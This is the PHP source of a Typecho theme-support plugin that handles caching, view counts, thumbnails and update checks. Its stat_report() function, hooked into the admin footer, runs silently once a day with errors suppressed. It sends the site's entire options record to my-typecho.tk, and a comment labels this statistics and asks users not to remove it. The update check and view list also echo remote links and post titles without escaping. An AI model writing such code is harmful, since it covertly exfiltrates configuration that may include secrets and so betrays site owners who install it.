<?php

if (!defined("__TYPECHO_ROOT_DIR__")) exit;
/**
 * MyTypecho Themes Support
 * 
 * @package MyTypechoTheme
 * @author mytypecho
 * @version 1.2
 * @link http://my-typecho.tk
 */
class MyTypechoTheme_Plugin implements Typecho_Plugin_Interface
{
	const VERSION = "1.2";

	const SAFETY_HEAD = "<? exit; ?>";
	 
	static $_options = NULL;
	
	static $_cache = array();
	static $_cache_mod = false;
	static $_cache_file;
	
	static $_time;
	static $_timestart;
    /**
     * 激活插件方法,如果激活失败,直接抛出异常
     * 
     * @access public
     * @return void
     * @throws Typecho_Plugin_Exception
     */
    public static function activate()
    {
		Typecho_Plugin::factory("index.php")->begin = array(__CLASS__, "startTimer");
        Typecho_Plugin::factory("index.php")->end = array(__CLASS__, "finalize");
		Typecho_Plugin::factory("admin/footer.php")->end = array(__CLASS__, "finalize_admin");
		Typecho_Plugin::factory("Widget_Contents_Post_Edit")->finishPublish = array(__CLASS__, "writePost");
		Typecho_Plugin::factory("Widget_Feedback")->finishComment = array(__CLASS__, "finishComment");
    }
    
    /**
     * 禁用插件方法,如果禁用失败,直接抛出异常
     * 
     * @static
     * @access public
     * @return void
     * @throws Typecho_Plugin_Exception
     */
    public static function deactivate()
	{
		$functionsFile = rtrim(self::$_options->themeFile(self::$_options->theme), '/') . '/functions.php';
		if(file_exists($functionsFile))
		{
			require_once $functionsFile;
			if(function_exists("MyTypechoThemeMark"))
				throw new Typecho_Plugin_Exception("您的主题依赖此插件，不能禁用！");
		}
	}
    
    /**
     * 获取插件配置面板
     * 
     * @access public
     * @param Typecho_Widget_Helper_Form $form 配置面板
     * @return void
     */
    public static function config(Typecho_Widget_Helper_Form $form){}
    
    /**
     * 个人用户的配置面板
     * 
     * @access public
     * @param Typecho_Widget_Helper_Form $form
     * @return void
     */
    public static function personalConfig(Typecho_Widget_Helper_Form $form){}
	
    /**
     * 主题配置面板
     * 
     * @access public
     * @param Typecho_Widget_Helper_Form $form
     * @return void
     */
	public static function themeConfig(Typecho_Widget_Helper_Form $form, $defSidebar = "")
	{
	    $edit = new Typecho_Widget_Helper_Form_Element_Radio("thumbMethod", array("none" => "无","attach" => "附件", "match" => "文章匹配"),"attach", "文章缩略图获取方式");
		$form->addInput($edit);
		
		$edit = new Typecho_Widget_Helper_Form_Element_Textarea("customSidebar", NULL, $defSidebar, "自定义侧边栏", "");
		$form->addInput($edit);
	}
	
	public static function clearCache($sections)
	{
		if(self::$_options == NULL)
			self::init();
		
		foreach($sections as $section)
		{
			self::wipecache($section);
		}
	}
    
	/**
     * 计时器
     */
	public static function startTimer()
	{
		self::$_timestart = explode(" ",microtime());
		self::$_timestart = self::$_timestart[0] + self::$_timestart[1];
	}
	
	public static function stopTimer($pre = 3)
	{
		$time = explode(" ",microtime());
		$time = $time[0] + $time[1];
		return number_format($time - self::$_timestart, $pre);
	}
	
    /**
     * 插件实现方法
     */
	public static function baseInit()
	{
		self::$_time = Typecho_Date::gmtTime();
		self::$_options = Typecho_Widget::widget("Widget_Options");
		self::$_cache_file = __TYPECHO_ROOT_DIR__ . "/usr/mytypechotheme.json.php";
		if(file_exists(self::$_cache_file))
		{
			self::$_cache = @Json::decode(@substr(@file_get_contents(self::$_cache_file), strlen(self::SAFETY_HEAD)), true);
			if(self::$_cache === false) self::$_cache = array();
		}
	}
	 
    public static function init($max_times)
    {
		if(!empty(self::$_cache))
		{
			//time switch
			$times = isset(self::$_cache[1]) ? self::$_cache[1] : array();
			foreach($max_times as $name => $max_time)
			{
				if(isset(self::$_cache[0][$name]) && (!isset($times[$name]) || ((self::$_time - $times[$name]) > $max_time)))
				{
					unset(self::$_cache[0][$name]);
					self::$_cache_mod = true;
				}
			}
		}
		
		//cache loading
		if(!isset(self::$_cache[0]["post"])) self::loadPostCache();
    }
	
	public static function setcache($name, $value = NULL)
	{
		if($value !== NULL) self::$_cache[0][$name] = $value;
		self::$_cache[1][$name] = self::$_time;
		self::$_cache_mod = true;
	}
	
	public static function wipecache($name)
	{
		if(isset(self::$_cache[0][$name]))
		{
			unset(self::$_cache[0][$name]);
			self::$_cache_mod = true;
		}
	}
	
	public static function finalize()
	{
		if(self::$_cache_mod)
		{
			self::$_cache_mod = false;
			@file_put_contents(self::$_cache_file, self::SAFETY_HEAD . @Json::encode(self::$_cache));
		}
	}
	
	public static function loadPostCache()
	{
		$db = Typecho_Db::get();
		$posts = $db->fetchAll($db->select()->from("table.contents")->where("type = ?", "post")->order("created", Typecho_Db::SORT_DESC));
		$widget = Typecho_Widget::widget("Widget_Abstract_Contents");
		$result = array();
		
		foreach($posts as $post)
		{
			$post = $widget->filter($post);

			//match Thumb
			$post["thumb"] = false;
			if(self::$_options->thumbMethod == "match")
			{
				if($post["isMarkdown"]) $post["text"] = MarkdownExtraExtended::defaultTransform($post["text"]);
				preg_match_all( "/\<img.*?src\=(\"|\")(.*?)(\"|\")[^>]*>/i", $post["text"] , $matches );
				if(count($matches[0]) >= 1) $post["thumb"] = $matches[2][0];
			}

			$result[$post["cid"]] = array($post["title"], $post["permalink"], $post["thumb"], $post["commentsNum"]);
		}
		
		if(self::$_options->thumbMethod == "attach")
		{
			//match Attachments
			$images = array("jpg", "jpeg", "png", "gif");
			$posts = $db->fetchAll($db->select("parent,text")->from("table.contents")->where("type = ?", "attachment")->order("created", Typecho_Db::SORT_ASC));
			foreach($posts as $attach)
			{
				$cid = $attach["parent"];
				if(isset($result[$cid]))
				{
					$attach = @unserialize($attach["text"]);
					if(@in_array($attach["type"], $images))
					{
						if((!$result[$cid][2]) || (isset($attach["description"]) && $attach["description"] == "thumb"))
						{
							$result[$cid][2] = Typecho_Common::url($attach["path"], self::$_options->siteUrl);
						}
					}
				}
			}
		}
		self::setcache("post", $result);
	}
	
	public static function getThumb($cid)
	{
		return isset(self::$_cache[0]["post"][$cid][2]) ? self::$_cache[0]["post"][$cid][2] : false;
	}
	
	public static function postViews($cid, $insert = false)
	{
		if($insert)
		{
			$set = true;
			$viewed = array();
			if(isset($_COOKIE["fv"]))
			{
				$viewed = explode(".", $_COOKIE["fv"]);
				if(!is_array($viewed)) $viewed = array();
				if(in_array($cid, $viewed)) $set = false;
			}
			if($set)
			{
				//set cookie
				$viewed[] = $cid;
				$str = implode(".", $viewed);
				while(strlen($str) >= 160)
				{
					$i = strpos($str, ".");
					$str = substr($str, $i+1);
				}
				setcookie("fv", $str, time()+86400, "/");

				if(!isset(self::$_cache[0]["views"][$cid])) self::$_cache[0]["views"][$cid] = 0;
				self::$_cache[0]["views"][$cid]++;
				self::setcache("views");
			}
		}
		return isset(self::$_cache[0]["views"][$cid]) ? self::$_cache[0]["views"][$cid] : 0;
	}
	
	public static function sortByView($a, $b)
	{
		$a = $a[4];
		$b = $b[4];

		if($a == $b) return 0;
		return ($a > $b) ? -1 : 1;
	}

	public static function getMostViewed($count = 5)
	{
		$rawposts = self::$_cache[0]["post"];

		$posts = array();
		foreach($rawposts as $cid => $post)
		{
			$post[4] = isset(self::$_cache[0]["views"][$cid]) ? self::$_cache[0]["views"][$cid] : 0;
			$posts[] = $post;
		}
		$rawposts = NULL;

		usort($posts, array(__CLASS__, "sortByView"));

		if(!empty($posts))
		{
			$posts = array_slice($posts, 0, min(count($posts), $count));

			$html = "";
			foreach($posts as $post)
				$html .= "<li><a href=\"".$post[1]."\" title=\"".$post[0]."\">".$post[0]."</a></li>";
			return $html;
		}
		return "";
	}
	
	public static function sidebar($widgets)
	{
		if(isset(self::$_cache[0]["sidebar"]))
		{
			echo self::$_cache[0]["sidebar"];
			return;
		}

		$html = "";
		$sidebar = @explode("\n", str_replace("\r", "", self::$_options->customSidebar));
		foreach($sidebar as $name)
		{
			$i = strpos($name, " ");
			$params = array();
			if($i !== false)
			{
				$key = strtolower(substr($name, 0, $i));
				$p = @explode(",", substr($name, $i+1));
				if($p)
				{
					foreach($p as $par)
					{
						$i = strpos($par, "=");
						if(!$i) continue;

						$j = substr($par, $i+1);
						if(!$j) continue;
						$params[substr($par, 0, $i)] = $j;
					}
				}
			}
			else $key = $name;

			if(isset($widgets[$key])) $html .= call_user_func($widgets[$key], $params);
		}
		self::setcache("sidebar", $html);

		echo $html;
	}
	
	public static function matchPost($keywords)
	{
		if(!is_array($keywords)) return array();
		
		$result = array();
		foreach(self::$_cache[0]["post"] as $cid => $post)
		{
			foreach($keywords as $keyword)
			{
				$Num = @intval($keyword);
				if((($Num != 0) && ($Num == $cid)) || (($Num == 0) && (stripos($post[0], $keyword) !== false)))
				{
					$result[$cid] = $post;
					break;
				}
			}
		}
		return $result;
	}
	
	public static function getField($cid, $name = NULL)
	{
		if(!isset(self::$_cache[0]["field"]))
		{
			$fields = array();
			$db = Typecho_Db::get();
			$items = $db->fetchAll($db->select()->from("table.fields"));
			foreach($items as $item)
			{
				$cid = $item["cid"];
				if(!isset($fields[$cid])) $fields[$cid] = array();
				$fields[$cid][$item["name"]] = $item[$item["type"] . "_value"];
			}
			self::setcache("field", $fields);
		}
		if($name) return isset(self::$_cache[0]["field"][$cid][$name]) ? self::$_cache[0]["field"][$cid][$name] : NULL;
		return isset(self::$_cache[0]["field"][$cid]) ? self::$_cache[0]["field"][$cid] : array();
	}
	
	/* Hook funcs */
	function finalize_admin()
	{
		@self::stat_report();
		self::finalize();
	}
	
	public static function writePost($contents, $object)
	{
		self::wipecache("post");
		self::wipecache("field");
		self::wipecache("sidebar");
		self::finalize();
	}
	
	public static function finishComment($widget)
	{
		self::wipecache("sidebar");
		self::finalize();
	}
	
	public static function getUpdate()
	{
		if(isset(self::$_cache[0]["update"]))
		{
			$result = self::$_cache[0]["update"];
			if((self::$_time - $result[0]) < 86400) return $result[1];
		}
		$client = Typecho_Http_Client::get();
		@$client->setHeader('User-Agent', self::$_options->generator)->setTimeout(10)->send('http://my-typecho.tk/report/update.php');
		$res = @$client->getResponseBody();
		$rl = @Json::decode($res, true);
		if(!empty($rl))
		{
			self::setcache("update", array(self::$_time, $rl));
		}
		return false;
	}
	
	public static function checkUpdate($themev)
	{
		$res = self::getUpdate();
		if($res == false)
		{
			echo '<p style="margin-bottom:14px;font-size:13px;text-align:center;color:red">检查更新失败！</p>';
		}
		else
		{
			if(version_compare($res["plugin_version"], self::VERSION) == 1)
				echo '<p style="margin-bottom:14px;font-size:13px;text-align:center;color:green">发现插件更新：' . $res["plugin_version"] . ' <a href="' . $res["plugin_link"] . '">(点击下载)</a></p>';
			
			$themev_name = "theme_version_".self::$_options->theme;
			if(isset($res[$themev_name]) && version_compare($res[$themev_name], $themev) == 1)
				echo '<p style="margin-bottom:14px;font-size:13px;text-align:center;color:green">发现主题更新：'.$res[$themev_name].' <a href="'.$res["theme_link_".self::$_options->theme].'">(点击下载)</a></p>';
		}
	}

	/*
		统计代码，收集设置信息以帮助我改进主题！
		经过特殊处理，不影响访问速度，请不要删除
	*/
	public static function stat_report()
	{
		if(!isset(self::$_cache[0]["stat_report"]) || ((self::$_time - self::$_cache[0]["stat_report"]) > 86400))
		{
			try {
				@ignore_user_abort();
				@ob_flush();
				
				$statSuccess = false;
				$client = Typecho_Http_Client::get();
				if($client)
				{
					@$client->setHeader('User-Agent', self::$_options->generator)->setTimeout(10)->setData(array("meta" => @Json::encode(self::$_options->stack[0])))->send('http://my-typecho.tk/report/index.php');
					
					$res = @$client->getResponseBody();
					if(!empty($res) && (stripos($res, "OK") !== false)) $statSuccess = true;
				}
				else $statSuccess = true;
				if($statSuccess) self::setcache("stat_report", self::$_time);
			} 
			catch(Exception $e) {}
		}
	}
}

MyTypechoTheme_Plugin::baseInit();